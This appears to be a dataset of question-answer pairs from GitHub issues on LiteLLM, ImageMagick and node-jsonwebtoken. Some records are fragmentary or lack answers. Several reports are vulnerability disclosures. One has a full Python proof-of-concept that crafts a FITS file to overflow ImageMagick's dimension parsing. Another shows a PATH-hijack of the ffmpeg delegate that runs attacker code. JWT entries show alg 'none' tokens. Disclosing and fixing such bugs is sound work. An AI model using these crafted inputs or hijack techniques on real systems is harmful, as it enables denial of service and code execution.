```text
name='atlassian_official'
url='https://mcp.atlassian.com/v1/sse'
transport=sse
auth_type=oauth2
authorization_url='https://mcp.atlassian.com/v1/authorize'
token_url='https://cf.mcp.atlassian.com/v1/token'
registration_url='https://cf.mcp.atlassian.com/v1/register'
```

The MCP client connects to LiteLLM at the server-specific MCP path, for example VS Code `mcp.json`:

```json
{
  "servers": {
    "atlassian-local": {
      "type": "http",
      "url": "http://localhost:4000/atlassian_official/mcp",
      "headers": {
        "Authorization": "Bearer sk-XXXX"
      }
    }
  }
}
```

Or with MCP Inspector:

```text
URL: http://localhost:4000/atlassian_official/mcp
Header: Authorization: Bearer sk-XXXX
```

LiteLLM first attempts to fetch OAuth metadata from these `.well-known` endpoints, which return 404:

```text
https://mcp.atlassian.com/.well-known/oauth-protected-resource/v1/sse
https://mcp.atlassian.com/.well-known/oauth-protected-resource
```

The log output is:

```text
22:02:59 - LiteLLM:DEBUG: mcp_server_manager.py:1223 - Failed to fetch MCP OAuth metadata from https://mcp.atlassian.com/.well-known/oauth-protected-resource/v1/sse: Client error '404 Not Found'
22:02:59 - LiteLLM:DEBUG: mcp_server_manager.py:1223 - Failed to fetch MCP OAuth metadata from https://mcp.atlassian.com/.well-known/oauth-protected-resource: Client error '404 Not Found'
```

The correct Atlassian URL appears to be:

```text
https://mcp.atlassian.com/.well-known/oauth-authorization-server
```

When MCP Inspector fetches `/.well-known/oauth-authorization-server`, LiteLLM returns root OAuth endpoints without the MCP server name:

```json
{
  "issuer": "http://localhost:4000/",
  "authorization_endpoint": "http://localhost:4000/authorize",
  "token_endpoint": "http://localhost:4000/token",
  "registration_endpoint": "http://localhost:4000/register"
}
```

I expected server-specific endpoints when querying through `/atlassian_official/mcp`:

```json
{
  "issuer": "http://localhost:4000/",
  "authorization_endpoint": "http://localhost:4000/atlassian_official/authorize",
  "token_endpoint": "http://localhost:4000/atlassian_official/token",
  "registration_endpoint": "http://localhost:4000/atlassian_official/register"
}
```

The correct response is only returned when explicitly requesting:

```text
GET /.well-known/oauth-authorization-server/atlassian_official
```

When redirected to authorization, the `client_id` is set to `dummy_client` with no reference to the MCP server:

```text
http://localhost:4000/authorize?response_type=code&client_id=dummy_client&code_challenge=z91XXX&...
```

This fails with:

```json
{"detail": "MCP server not found"}
```

Additional observed flow: MCP clients such as VS Code Copilot and `mcp-inspector` call root OAuth discovery endpoints even when they receive server-specific `authorization_servers` URLs:

```text
1. GET /.well-known/oauth-protected-resource/mcp/atlassian_official → 200
   Returns: authorization_servers: ["http://localhost:4000/atlassian_official"]

2. GET /.well-known/oauth-protected-resource → 200  ← ROOT (unexpected)
3. GET /.well-known/oauth-authorization-server → 200 ← ROOT (unexpected)
   Returns generic endpoints without server name

4. POST /register → client_id: "dummy_client"
5. GET /authorize?client_id=dummy_client → 404
```

Per RFC 8414, I expected clients to construct `/.well-known/oauth-authorization-server/atlassian_official` from the `authorization_servers` value, but these clients call the root `/.well-known/oauth-authorization-server`. A single-server workaround would be:

```python
if not mcp_server_name:
    mcp_server_name = "atlassian_official"
```

Can you confirm the root cause and suggest how LiteLLM should handle this OAuth flow so dynamic client registration works and does not end in `{"detail":"MCP server not found"}`?
qa_pairs.answer:
The maintainer confirmed the root cause: VS Code Copilot and `mcp-inspector` call root `.well-known` endpoints even when connected through `/atlassian_official/mcp`, so the MCP server name is lost through discovery, registration, and authorization. At the root `/register`, LiteLLM returns `client_id: "dummy_client"`; then `/authorize` uses `lookup_name = mcp_server_name or client_id` in `discoverable_endpoints.py:303`, causing it to look up `dummy_client` as an MCP server and return `404 "MCP server not found"`.

Suggested fixes were: default root `.well-known`/`/register` handling to the only OAuth-configured MCP server for single-server setups, and make `/register` return a `client_id` that encodes or uses the MCP server name instead of `"dummy_client"`. The maintainer said Option A plus Option B was the most practical workaround because, although clients arguably should use `/.well-known/oauth-authorization-server/atlassian_official` per RFC 8414, multiple major clients do not.

title: [Bug]: Incorrect redirect URLs when LiteLLM is deployed in a distributed environment (e.g k8s)

qa_pairs.question:
In LiteLLM deployed behind nginx-ingress with TLS termination and a security-hardened ConfigMap, the UI gets stuck in a login redirect loop. Environment:
- Image: `ghcr.io/berriai/litellm-database:main-stable`
- Kubernetes with nginx-ingress (TLS termination, security-hardened ConfigMap)
- Cookie flags added by nginx: `Secure; HttpOnly`

The LiteLLM UI JavaScript reads the JWT token from `document.cookie` via `getCookie("token")`:

```javascript
u = typeof document ? getCookie("token") : null
f = checkTokenValidity(u) && !admin_ui_disabled
// if f is false → redirect to /ui/login
```

The `/v2/login` endpoint sets the cookie without explicit `httponly`/`secure` flags:

```python
json_response.set_cookie(key="token", value=jwt_token)
# Starlette defaults: httponly=False, secure=False
```

Directly from LiteLLM, verified by exec'ing into the pod and hitting localhost:4000, the response is:

```text
set-cookie: token=eyJ...; Path=/; SameSite=lax
```

Through nginx-ingress, hitting the external URL, the response is:

```text
set-cookie: token=eyJ...; Path=/; SameSite=lax; Secure; HttpOnly
```

Because nginx adds `HttpOnly`, JavaScript cannot read the cookie, so `getCookie("token")` returns `null` and the UI redirects to `/ui/login` in a loop. An attempted override was:

```yaml
nginx.ingress.kubernetes.io/configuration-snippet: |
  proxy_cookie_flags token nohttponly;
```

but `allow-snippet-annotations` is disabled on the cluster, so the snippet is ignored.

The suggested fix is for `/v2/login` to include the JWT token in the response body, not just the cookie:

```python
json_response = JSONResponse(
    content={"redirect_url": litellm_dashboard_ui, "token": jwt_token},
    status_code=status.HTTP_200_OK,
)
json_response.set_cookie(key="token", value=jwt_token)
```

and for the UI login handler to check the response body first and set the token via `document.cookie` before navigating.

I also tested the alpha image `ghcr.io/berriai/litellm:fix_ui_proxy_redirects_v1.81.14_v2-v1.81.14-redirect-alpha.2`, but the login redirect loop persists. The `/v2/login` response through nginx-ingress is still:

```text
HTTP/2 200
set-cookie: token=eyJ...; Path=/; SameSite=lax; Secure; HttpOnly
content-type: application/json

{"redirect_url":"https://<redacted>/ui/?login=success"}
```

The response body still only contains `redirect_url`, not the JWT token, and the UI still reads auth via `getCookie("token")`, which returns `null` because `HttpOnly` prevents JavaScript access. Can LiteLLM fix this by returning the JWT in the `/v2/login` response body so the frontend can set a JS-accessible cookie directly?
qa_pairs.answer: A fix was submitted in PR #23532. It returns the JWT token in the `/v2/login` response body so the frontend can set a JavaScript-accessible cookie directly, bypassing any `HttpOnly` flags added by reverse proxies.

qa_pairs.question:
In LiteLLM Proxy 1.80.15 (`ghcr.io/berriai/litellm-database:main-stable`, tested January 2026) running via Docker Compose with `usage-based-routing-v2`, multi-tag routing is returning deployments that share zero tags with the request. I found related issue #17081 about similar OR logic behavior, and this is affecting a production multi-cloud setup with 36+ deployments.

Configuration:
```yaml
model_list:
  - model_name: test-model
    litellm_params:
      model: azure/deployment-1
      api_base: https://example-us.openai.azure.com/
      api_key: os.environ/KEY_1
    tags: ["us", "customers"]
    
  - model_name: test-model
    litellm_params:
      model: azure/deployment-2  
      api_base: https://example-eu.openai.azure.com/
      api_key: os.environ/KEY_2
    tags: ["eu", "products"]

router_settings:
  enable_tag_filtering: true
  routing_strategy: usage-based-routing-v2
```

Test request:
```bash
curl -X POST 'http://localhost:4000/chat/completions' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer sk-1234' \
  -d '{
    "model": "test-model",
    "tags": ["us", "customers"],
    "messages": [{"role": "user", "content": "Test routing"}]
  }'
```

title: SIGABRT (double-free) converting SVG with `gradientTransform` on `<linearGradient>`

qa_pairs.question:
ImageMagick 7 crashes with a double-free/SIGABRT when converting an SVG that has a `gradientTransform` attribute on a `<linearGradient>` element. Removing the `gradientTransform` attribute makes conversion succeed, even when it is an identity matrix. ImageMagick 6 is not affected.

Error output:

```text
free(): double free detected in tcache 2
Aborted (core dumped)
```

Minimal reproducer SVG:

```xml
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
  <defs>
    <linearGradient id="g" gradientTransform="matrix(1 0 0 1 0 0)" gradientUnits="userSpaceOnUse">
      <stop offset="0" style="stop-color:red"/>
      <stop offset="1" style="stop-color:blue"/>
    </linearGradient>
  </defs>
  <rect fill="url(#g)" width="512" height="512"/>
</svg>
```

Steps to reproduce:

```bash
# Save the SVG above as crash.svg, then:
magick crash.svg crash.png
# → exit code 134 (SIGABRT)
```

CI repro: https://github.com/ryan-williams/imagemagick-svg-crash

GHA run showing the crash: https://github.com/ryan-williams/imagemagick-svg-crash/actions/runs/22469220910

Versions tested:

| Version | Result |
|---|---|
| ImageMagick 7.1.2-16 (Beta), Ubuntu x86_64 (source build) | crashes (double-free) |
| ImageMagick 7.1.2-15, macOS arm64 (Homebrew) | crashes |
| ImageMagick 6.9.12-98, Ubuntu x86_64 (apt) | works fine |
| librsvg 2.58.0 (`rsvg-convert`) | works fine |

Tested on macOS arm64 via Homebrew and Ubuntu x86_64 via GitHub Actions. What is the root cause of this double-free in ImageMagick 7's SVG conversion, and what change fixes it?
qa_pairs.answer: The crash was introduced by commit `9db96365e` from 2026-02-15, tag `7.1.2-14`, the security fix for `GHSA-xpg8-7m6m-jf56`. That commit made `value` in `SVGStartElement` a heap-allocated string via `SVGEscapeString()` and freed it with `DestroyString(value)`, but the existing `gradientTransform` and `transform` token-parsing loops reassigned `value` to `tokens[j+1]`, leaking the original allocation and then double-freeing the token. The fix in PR `#8583` is to use a separate `token_value` local in each inner loop.

title: Integer Overflow in FITS Image Dimension Parsing

qa_pairs.question:
In ImageMagick 7.1.2-13 on Linux Ubuntu 22.04.5 64-bit, FITS parsing appears to multiply NAXIS1 and NAXIS2 as int values to compute the total number of pixels. With large values this overflows, producing an incorrect pixel count and potentially causing a crash/abort parsing denial of service, excessive memory allocation, and possible out-of-bounds access. On a 32-bit system, this code path may lead to an out-of-bounds write, which I am currently testing.

PoC: start from this FITS file:
[[fits.gsfc.nasa.gov/samples/WFPC2u5780205r_c0fx.fits](https://fits.gsfc.nasa.gov/samples/WFPC2u5780205r_c0fx.fits)](https://fits.gsfc.nasa.gov/samples/WFPC2u5780205r_c0fx.fits)

Use the following Python file to transfer it to 65536*65537:
```python
#!/usr/bin/env python3
import sys
from typing import Tuple, Dict

FITS_BLOCK = 2880
CARD = 80

def _read_cards(buf: bytes, max_cards: int = 4096) -> Tuple[list[bytes], int]:
    """
    Read cards from buf[0:] in 80-byte increments until finding the END card (keyword == 'END').
    Returns (cards, header_len_bytes), where header_len_bytes is the padded header length (2880-aligned).
    """
    cards = []
    end_index = None

    # Need to at least cover up to END; typically primary header won't be too long, setting an upper limit here
    for i in range(0, min(len(buf), max_cards * CARD), CARD):
        card = buf[i:i + CARD]
        if len(card) < CARD:
            break
        cards.append(card)
        keyword = card[0:8].decode("ascii", errors="replace").rstrip()
        if keyword == "END":
            end_index = i + CARD
            break

    if end_index is None:
        raise ValueError("Cannot find END card in the first part of the file (primary header seems corrupted).")

    # Total header length needs to be padded to 2880 boundary (ImageMagick code will read the padding)
    header_len = ((end_index + FITS_BLOCK - 1) // FITS_BLOCK) * FITS_BLOCK
    return cards, header_len

def _parse_key_value(card: bytes) -> Tuple[str, str]:
    """
    Parse the keyword and value string from a card (as lenient as possible).
    """
    kw = card[0:8].decode("ascii", errors="replace").strip()
    rest = card[8:].decode("ascii", errors="replace")
    return kw, rest

def _get_int_value_from_card_rest(rest: str) -> int | None:
    """
    Extract an integer from the card[8:] string (handles '= <num>' format).
    """
    s = rest
    if len(s) == 0:
        return None
    if s[0] != "=":
        return None
    # Skip "= ", then strip
    s = s[1:]
    if s.startswith(" "):
        s = s[1:]
    s = s.strip()
    # Value may have a comment "/ ..."
    if "/" in s:
        s = s.split("/", 1)[0].strip()
    # FITS integers are typically right-aligned and may have a sign
    try:
        return int(s, 10)
    except ValueError:
        return None

def _format_int_card(keyword: str, value: int, comment: str = "") -> bytes:
    """
    Generate a standard FITS 80-byte card: KEYWORD= <value> / comment
    Note: keyword must be <=8 bytes and ASCII.
    """
    kw = (keyword[:8]).ljust(8)
    rhs = f"= {value:20d}"  # Common FITS format: numeric field width 20
    if comment:
        rhs += f" / {comment}"
    rhs = rhs[:72].ljust(72)
    card = (kw + rhs).encode("ascii", errors="strict")
    if len(card) != CARD:
        raise AssertionError("card length is not 80 bytes")
    return card

def _extract_primary_header_fields(cards: list[bytes]) -> Dict[str, int]:
    fields: Dict[str, int] = {}
    for c in cards:
        kw, rest = _parse_key_value(c)
        kw_low = kw.lower()
        if kw_low in ("bitpix", "naxis", "naxis1", "naxis2", "naxis3", "simple"):
            v = _get_int_value_from_card_rest(rest)
            if v is not None:
                fields[kw_low] = v
    return fields

def patch_naxis(in_path: str, out_path: str, new_naxis1: int, new_naxis2: int) -> None:
    data = open(in_path, "rb").read()

    cards, header_len = _read_cards(data)
    fields = _extract_primary_header_fields(cards)

    if "bitpix" not in fields:
        raise ValueError("BITPIX not found in primary header; cannot compute data size safely.")
    if "naxis" not in fields:
        raise ValueError("NAXIS not found in primary header.")
    bitpix = fields["bitpix"]
    naxis = fields["naxis"]

    if naxis < 2:
        # You're now changing NAXIS1/2; if naxis<2, the FITS primary HDU isn't a 2D image
        # ImageMagick code also requires rows/columns > 0 to proceed
        # Here we directly set NAXIS to 2 (conservative approach)
        naxis = 2

    if bitpix == 0 or (abs(bitpix) % 8) != 0:
        raise ValueError(f"Unsupported BITPIX={bitpix} for this patcher (expect 8/16/32/64/-32/-64).")
    bytes_per_pixel = abs(bitpix) // 8

    if new_naxis1 <= 0 or new_naxis2 <= 0:
        raise ValueError("new NAXIS1/NAXIS2 must be positive.")

    # --- Modify header cards (don't change card count/total bytes, only modify corresponding card content)
    def replace_or_append(keyword: str, value: int):
        nonlocal cards
        key_upper = keyword.upper()
        replaced = False
        for idx, c in enumerate(cards):
            kw = c[0:8].decode("ascii", errors="replace").strip().upper()
            if kw == key_upper:
                cards[idx] = _format_int_card(key_upper, value)
                replaced = True
                break
        if not replaced:
            # Inserting a new card before END: this would change header length and subsequent offsets.
            # To "never break the structure", we don't insert.
            # In actual FITS, NAXIS1/2 should exist; if not, the original file is very atypical.
            raise ValueError(f"{key_upper} card not found; refusing to insert cards (would shift the file).")

    # If needed, first set NAXIS to 2 (prerequisite: NAXIS card originally exists)
    if "naxis" in fields:
        replace_or_append("NAXIS", naxis)
    else:
        raise ValueError("NAXIS card not found; cannot safely patch without shifting.")

    replace_or_append("NAXIS1", new_naxis1)
    replace_or_append("NAXIS2", new_naxis2)

    # --- Reassemble header and maintain its length as the original header_len (2880-aligned)
    new_header = b"".join(cards)
    if len(new_header) > header_len:
        # Theoretically won't happen (we didn't insert cards)
        raise ValueError("Patched header unexpectedly exceeds original padded header length.")
    new_header = new_header.ljust(header_len, b" ")

    # --- Handle primary data unit
    old_data = data[header_len:]
    new_data_bytes = new_naxis1 * new_naxis2 * bytes_per_pixel

    # Conservative: only ensure the primary data area is long enough; don't handle extensions (if the original file has extensions, changing dimensions may cause semantic inconsistency)
    if len(old_data) < new_data_bytes:
        new_data = old_data + (b"\x00" * (new_data_bytes - len(old_data)))
    else:
        new_data = old_data[:new_data_bytes]

    # Extra: pad data to 2880 per FITS convention (not mandatory, but more standard)
    pad = (-len(new_data)) % FITS_BLOCK
    if pad:
        new_data += b"\x00" * pad

    with open(out_path, "wb") as f:
        f.write(new_header)
        f.write(new_data)

def main():
    if len(sys.argv) != 5:
        print(f"Usage: {sys.argv[0]} <in.fits> <out.fits> <new_naxis1> <new_naxis2>")
        sys.exit(2)

    in_path, out_path = sys.argv[1], sys.argv[2]
    n1, n2 = int(sys.argv[3]), int(sys.argv[4])
    patch_naxis(in_path, out_path, n1, n2)
    print("OK:", out_path)

if __name__ == "__main__":
    main()
```

Usage:
```bash
yuelinwang@XXF-GPU-03:/data/ylwang/LargeScan/targets/ImageMagick/test++$ python3 112.py 112.fits 112+.fits 65536 65537
OK: 114.fits
```

Then use magick to read the file:
```bash
./utilities/magick /data/ylwang/LargeScan/targets/ImageMagick/test++/112+.fits null
coders/fits.c:420:56: runtime error: signed integer overflow: 65536 * 65537 cannot be represented in type 'int'
coders/fits.c:436:54: runtime error: signed integer overflow: 65536 * 65537 cannot be represented in type 'int'
```

Can you confirm and address this integer overflow in FITS image dimension parsing?
qa_pairs.answer: Patch commit: https://github.com/ImageMagick/ImageMagick/commit/f03ada70c095945075703cc79fbe27485af1fd9f

title: Insecure File Access Due to External Control of Environment Variables in Magick++

qa_pairs.answer: ImageMagick uses this pattern only in demos and test utilities, and those executables are not included in a standard installation. If the code is used independently, developers should sanitize user-controlled paths before passing them to ImageMagick. As an additional protection, filesystem access can be restricted with an ImageMagick security policy that denies all reads by default and allows reads only from explicitly allowed directories, e.g. denying `pattern="*"` and allowing read access only under `/opt/ImageMagick/*`.
grounding_sources: ImageMagick demos and test utilities are not included in a standard installation

qa_pairs.question:
In ImageMagick 7, I am using `magick -ping "$file" -format '%[mime:type]\n' info:` on user-controlled inputs. For video files such as `video/mp4`, ImageMagick delegates to ffmpeg:

```
video:decode =>          "ffmpeg' -nostdin -loglevel error -i '%s' -an -f rawvideo -y %s '%s"
```

This can take an extraordinary amount of time and CPU, and interrupting `magick` with Ctrl-C does not kill the `ffmpeg` child or clean up `/tmp` symlinks. I also found that because delegates are commands resolved via `PATH`, a crafted environment/input can execute arbitrary code, for example:

```sh
$ cat ffmpeg
#!/bin/sh --
echo hi > owned

$ PATH=.:$PATH magick -ping video/1917.mp4 -format '%[mime:type]\n' info:
magick: insufficient image data in file `/tmp/magick-5EIzi9um6SIwIOvJRf1zJ0nd4fuEaiaD' @ error/webp.c/ReadWEBPImage/560.

$ cat owned
hi
```

I want a per-invocation way for a script to avoid delegate execution, rather than editing global `/etc/ImageMagick-7/delegates.xml` or `/etc/ImageMagick-7/policy.xml`. If a distribution disables execution of delegates by default, how can a user enable delegates for one specific requirement? Is it all-or-nothing based on distribution/admin policy?
qa_pairs.answer: The security policy can allow all delegates, some delegates, or none. If the administrator disables some or all delegates, a user cannot enable them without administrative privileges; that is the administrator’s role in dictating policy for the environment. title: JXL->JXL processing (to remove alpha channel) drops color profile

qa_pairs.question:
In ImageMagick 7.1.1-44 on Fedora 41 x86_64, with JXL delegate `JPEG XL (ISO/IEC 18181) (libjxl 0.10.4)`, converting a Fedora 42 background JXL image to remove its alpha channel changes/drops the original ICC color profile. The input `f42-01-day.jxl` is `TrueColorAlpha`, has `Profiles: Profile-icc: 9080 bytes`, and `icc:description: sRGB-elle-V2-srgbtrc.icc`. I run:

```bash
magick f42-01-day.jxl -quality 100 -alpha off f42-01-day_noalpha.jxl
```

The output correctly becomes `TrueColor` with no alpha channel, but its profile changes to `Profiles: Profile-icc: 536 bytes` and `icc:description: RGB_D65_SRG_Rel_SRG`; the rendering intent also changes from Perceptual to Relative. I also tried extracting/reapplying the color profile externally, but `exiftool` cannot find the profile in the JXL file and `exiv2` does not recognize the JXL file as valid. Why is ImageMagick’s JXL-to-JXL processing not preserving the original ICC profile, and is this an ImageMagick delegate issue or a libjxl behavior?
qa_pairs.answer: The issue is in ImageMagick’s JXL delegate logic: `WriteJXLImage()` always calls `JXLEncoderSetColorEncoding()` via `JXLWriteMetadata()`, while libjxl’s docs say only one of `JXLEncoderSetColorEncoding()` or `JXLEncoderSetICCProfile()` can be used. The delegate currently never calls `JXLEncoderSetICCProfile()`, and even if it did, the unconditional `JXLEncoderSetColorEncoding()` call would make that invalid. `JXLEncoderSetColorEncoding()` should only be used when explicitly not applying an ICC profile; EXIF/XMP preservation via `JXLEncoderAddBox()` does not preserve profiles that are not stored in EXIF/XMP blobs.

In ImageMagick 7.1.1.44 on Arch Linux, why does converting a PDF scan to a 1-bit TIFF with Fax or Group4 compression silently produce an uncompressed TIFF, whereas rolling back to 7.1.1.43 produces the expected compressed CCITT/Fax TIFF?

Environment:

- OS: Linux, Arch Linux
- libtiff: 4.7.0

Command:

```sh
magick -density 300 input.pdf -depth 1 -compress Fax output.tiff
```

Expected result from:

```sh
magick identify -verbose output.tiff | grep Compression
```

is:

```text
Compression: Fax
```

Actual result in 7.1.1.44 is:

```text
Compression: None
```

The output is still bilevel/depth 1, but the file is about 1.31 MiB and uncompressed, instead of about 184 KiB with CCITT/Fax compression as in 7.1.1.43. `-compress Group4` behaves the same way.

Example `mediainfo` comparison:

7.1.1.44:

```text
> mediainfo Rocks_are_not_free.tiff
> General
> Complete name                            : Rocks_are_not_free.tiff
> Format                                   : TIFF
> File size                                : 1.31 MiB
> 
> Image
> Format                                   : Raw
> Format settings                          : Little
> Width                                    : 2 966 pixels
> Height                                   : 3 688 pixels
> Color space                              : Y
> Bit depth                                : 1 bit
> Compression mode                         : Lossless
> Density                                  : 300 dpcm
```

7.1.1.43:

```text
> mediainfo Rocks_are_not_free2.tiff
> General
> Complete name                            : Rocks_are_not_free2.tiff
> Format                                   : TIFF
> File size                                : 184 KiB
> 
> Image
> Format                                   : CCITT T.4
> Format settings                          : Little
> Width                                    : 2 966 pixels
> Height                                   : 3 688 pixels
> Color space                              : Y
> Bit depth                                : 1 bit
> Compression mode                         : Lossless
> Density                                  : 300 dpcm
```

The issue appears related to alpha: PDFs and RGBA PNGs fail to compress, RGB JPEGs and PNGs with `-alpha off` compress correctly. For example, this works around it:

```sh
magick -density 300 input.pdf -alpha off -compress fax output.tiff
```

title: Converting some images to PICT results in files that will crash a classic Mac system

qa_pairs.question:
In ImageMagick 7.1.1-34 on macOS 13.6.5, converting certain PNG images to PICT produces a file that freezes or shows a system error when opened on classic Mac OS systems. I reproduced this on Macintosh System 7.1, Mac OS 8, and Mac OS 9, using any application that can view PICT files such as SimpleText. Converting the PICT back to PNG using ImageMagick works, and I have not identified a modern app that has trouble viewing the bad PICT. Reproduction:

1. Convert the attached PNG to PICT:
   `magick bad.png bad.pict`
2. Copy `bad.pict` to a system running classic Mac OS and open it in a PICT-viewing application such as SimpleText.
3. The system freezes or displays a system error.

![bad](https://github.com/user-attachments/assets/b782b586-90d3-40fc-bde1-8438975e597d)
[bad.pict.zip](https://github.com/user-attachments/files/18142059/bad.pict.zip)

The PNG was attached as `bad.png`, and the crashing output was attached as `bad.pict.zip`. The PICT appears to be Extended Version 2, not a newer macOS-only format. What is wrong with ImageMagick’s generated PICT file, and what in the PICT reader/writer should be changed?
qa_pairs.answer: The issue was identified from Inside Macintosh: Volume V: when PICT pixel data is written, the scanline byteCount is one byte unless `rowBytes > 250`. In `bad.pict`, `rowBytes` is 240, but ImageMagick wrote each scanline `byteCount` as two bytes; manually changing those entries to one byte made classic Mac OS read the file. The same condition affects ImageMagick’s PICT reader, which could not open the fixed file and reported `error/pict.c/ReadPICTImage/1267.`; the checks in `coders/pict.c` at lines 504, 694, and 1087 should use `if (bytes_per_line > 250)`. PR: https://github.com/ImageMagick/ImageMagick/pull/7840/

```
aebc7411959c_web |     at Object.jwsSign [as sign] (/srv/www/node_modules/jws/lib/sign-stream.js:32:24)
aebc7411959c_web |     at Object.module.exports [as sign] (/srv/www/node_modules/jsonwebtoken/sign.js:204:16)

aebc7411959c_web |     at Query._handleFinalResultPacket (/srv/www/node_modules/mysql/lib/protocol/sequences/Query.js:149:8) {
```

The signing code is:

```
const token = jwt.sign( tokenPayload, myprivateKey, { algorithm: 'RS512', audience: req.params.uid } );
```

I do not know much about cryptography: what is the relation, if any, between the algorithm I choose, such as `RS512` or `RS256`, and the RSA modulus length? Can I sign my token with, say, the `RS256` algorithm and a modulus of 2048 if I wanted — i.e. do they need to match?
qa_pairs.answer: The modulus is one component of the RSA private key, and its length must be 2048 bits to be universally usable with JOSE. The shown key is only 512 bits; generate a 2048-bit key and you can use all RSA-based signing algorithms. The number in `RS256` or `RS512` only dictates the hash algorithm, so it does not need to match the RSA modulus length.

title: Use a default of `["HS256"]` for `verify` to be in sync with default for `sign`

qa_pairs.question:
In auth0/node-jsonwebtoken, `sign` defaults to `options.algorithm: "HS256"`, but `verify` appears not to default to `options.algorithms: ["HS256"]` and instead accepts other algorithms. For example, I can create and verify a token with algorithm `none` without explicitly allowing it:

```js
> jwt.sign({ user: 42 }, undefined, { algorithm: 'none' });
'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjo0MiwiaWF0IjoxNTkzNDM2NTEyfQ.'
```

The key is not needed, so I set it to `undefined`. By default I can verify that token without explicitly allowing `none`:

```js
> jwt.verify('eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjo0MiwiaWF0IjoxNTkzNDM2NTEyfQ.')
{ user: 42, iat: 1593436512 }
```

This also works if I accidentally pass `undefined` or anything else false-y as the key argument:

```js
> jwt.verify('eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjo0MiwiaWF0IjoxNTkzNDM2NTEyfQ.', process.env.MYKEY) // oops env var undefined
{ user: 42, iat: 1593436512 }
```

Also, by default `sign` sets `HS256`, but `verify` accepts a token signed with `HS512`. Should `verify` default to `algorithms: ["HS256"]` to stay in sync with `sign`, and should `none` require explicitly passing `algorithms: ["none"]`?
qa_pairs.answer: The maintainer said it is false that `verify` accepts all algorithms by default: its default `algorithms` value is derived from the `secretOrPublicKey` argument, and accidental acceptance of `none` tokens is prevented. Requiring `none` to be explicit is already tracked as duplicate issue #711. For HS512 versus HS256, they said accepting HS512 when the default signer uses HS256 is not a big deal, but in the next major version they plan to change signing so the algorithm is derived from `secretOrPrivateKey`, matching how verify works today.

title: Less Secure (jwt token decodes without any secret)

qa_pairs.question:
In auth0/node-jsonwebtoken, I created a JWT using `jwt.sign` with my own secret, then copied the token into jwt.io and was surprised that jwt.io decoded it without any secret and showed the username and password in the payload. Demo token:

```eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InNzYXR5YW1jaGF1aGFuIiwicGFzc3dvcmQiOiJ3aHlpdGlzbWUiLCJpYXQiOjE1ODUxMzM0ODMsImV4cCI6MTU4NTM5MjY4M30.bKtmn03-ZnAAzNxnNk9ZPlrsbbk8lUThMt24gwL-r2w```

Is this secure for token-based authentication in a web app, and why can the token be decoded without the secret?
qa_pairs.answer: `jwt.sign` signs a token; it does not encrypt it. A JWT can be decoded without verifying its signature, which is why jwt.io can show the payload, but providing the secret in jwt.io's `VERIFY SIGNATURE` section is what verifies the signature. The signature provides authenticity/integrity protection against tampering, not confidentiality, so sensitive values like passwords should not be exposed in the JWT payload.

title: Add option to ignore signature validation (e. g. for dev/test purposes)

qa_pairs.question: In auth0/node-jsonwebtoken, can an option be added to `jwt.verify()` to ignore signature validation for dev/test purposes? In dev and test environments I may need to work with a test JWT token that has no valid signature, for example when the token provider cannot be modified to create tokens in the manner a relying party needs for a special edge situation. I would like to manually modify the JWT payload and still run `jwt.verify()` checks such as `issuer`, `subject`, and `audience`; currently using `jwt.decode()` decodes the token but does not run those other verification checks. Ideally this would be a new option like `ignoreSignature`, analogous to `ignoreExpiration` and `ignoreNotBefore`. From looking at the source, it might be implementable around `verify.js` lines 126-134 in commit `a6235fa561b5c30884c97ea0b30c3db3b546ae2c`: https://github.com/auth0/node-jsonwebtoken/blob/a6235fa561b5c30884c97ea0b30c3db3b546ae2c/verify.js#L126-L134.
qa_pairs.answer: The maintainer said adding such an option to `verify()` would be too risky because without a valid signature the rest of the checks do not make sense and the token contents cannot be trusted. They recommended solving the special edge case by fixing interoperability, mocking the token provider in tests, or using a testing abstraction around `decode()`, possibly re-signing the decoded payload with a test secret or the `none` algorithm and then calling `verify()`. They also warned that any such workaround risks accidentally running in production due to misconfiguration.

title: DeprecationWarning: url.parse() used in proxy resolution → Node DEP0169

qa_pairs.question:
In Axios v1.13.2 in a Node/SSR environment, Axios triggers Node’s DEP0169 deprecation warning for `url.parse()` during proxy resolution:

```
(node:XXXX) [DEP0169] DeprecationWarning: `url.parse()` behavior is not standardized and prone to errors that have security implications. Use the WHATWG URL API instead.
```

The stack trace consistently points to Axios’ internal proxy resolution path:

```
at urlParse (node:url:136:13)
at Object.getProxyForUrl (node_modules/proxy-from-env/index.js:…)
at setProxy (node_modules/axios/lib/…)
at dispatchHttpRequest (...)
```

This happens in Node.js v18+ or v20+ / SSR environments such as Next.js, Express, or server functions when proxy support is enabled via `HTTP_PROXY` / `HTTPS_PROXY` / `NO_PROXY` env vars or Axios proxy configuration such as `proxy: true`. The `proxy-from-env` package used internally still depends on `url.parse()`. This pollutes SSR logs, `url.parse()` is flagged for removal in future Node versions, and there is no configuration to disable proxy resolution or switch Axios to WHATWG URL internally.

Expected behavior is that Axios should use WHATWG `URL` instead of `url.parse()` inside proxy resolution, avoid deprecated APIs for proxy detection, and not emit DEP0169 warnings in modern Node runtimes. Suggested fixes include replacing `url.parse()` usage inside Axios’ proxy path with `new URL()`, updating or wrapping `proxy-from-env` with a WHATWG-safe implementation, or adding a flag such as `proxyResolve: false` or `disableProxyEnv: true` to bypass the proxy resolver entirely.

Is this deprecation migration planned, or is Axios’ proxy-layer abstraction being refactored to use the WHATWG URL API?

title: ChatWithCrewFlow.__init__ makes blocking LLM call at module import, crashes containers on any LLM hiccup

qa_pairs.question:
In CrewAI, `ChatWithCrewFlow.__init__` in `ag_ui_crewai.crews` appears to trigger synchronous blocking LLM calls at module import time via `crewai.cli.crew_chat.generate_crew_chat_inputs`. Specifically, it calls `generate_input_description_with_ai` at `lib/crewai/src/crewai/cli/crew_chat.py:481`:

```python
response = chat_llm.call(messages=[{"role": "user", "content": prompt}])
```

and `generate_crew_description_with_ai` at `lib/crewai/src/crewai/cli/crew_chat.py:535`:

```python
response = chat_llm.call(messages=[{"role": "user", "content": prompt}])
```

